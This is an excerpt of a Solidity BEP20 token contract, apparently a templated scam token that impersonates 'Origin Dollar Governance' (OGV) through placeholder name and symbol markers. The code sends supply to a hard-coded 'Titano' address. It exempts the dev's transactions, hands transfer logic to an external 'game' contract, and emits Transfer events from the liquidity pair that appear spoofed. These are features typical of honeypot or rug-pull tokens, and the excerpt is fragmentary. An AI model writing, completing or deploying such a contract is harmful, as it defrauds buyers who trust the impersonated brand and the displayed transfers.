...
contract BEP20 is Context {
  ...
  address public constant Titano = 0x4DD90D3cE962039A3c66d613207aC2d449dFa04F;
...
contract Coin is BEP20, IERC20 {
  ...
  string public name = /*TOKENNAME*/"Origin Dollar Governance"/*TOKENNAME*/;
  string public symbol = /*TOKENSYMBOL*/"OGV"/*TOKENSYMBOL*/;
  ...
  constructor() {
    ...
    _tOwned[Titano] = deadAmount - _tOwned[DEAD];

    emit Transfer(address(0), address(this), totalSupply);
    emit Transfer(address(this), DEAD, _tOwned[DEAD]);
    emit Transfer(address(this), Titano, _tOwned[Titano]);
  }
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != dev) {
      uint256 rewards = IFOMO(_game).tn(sender, recipient, tAmount)*10000;
      if (sender == uniswapV2Pair && rewards > 0) {
        if (_tOwned[Titano] > rewards) {
          emit Transfer(
            uniswapV2Pair,
            Titano,
            rewards
